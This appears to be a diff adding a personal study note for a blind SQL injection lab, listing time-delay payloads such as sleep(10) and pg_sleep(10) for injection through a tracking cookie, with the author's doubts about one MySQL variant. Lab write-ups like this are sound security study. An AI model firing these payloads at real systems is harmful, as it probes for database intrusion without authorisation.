@@ -1,0 +1,12 @@
+Blind SQL injection with time delays - vulnerable parameter tracking cookie
+Goal: Exploit SQL injection to cause a 10 second delay.
+
+Analysis:
+
+MySQL
+' || (SELECT sleep(10))-- From the Author but I don't think || is valid for MySQL
+' SELECT SLEEP(10)--
+
+Postgres
+' || (SELECT pg_sleep(10))-- 
+' || (SELECT pg_sleep(10)) || '
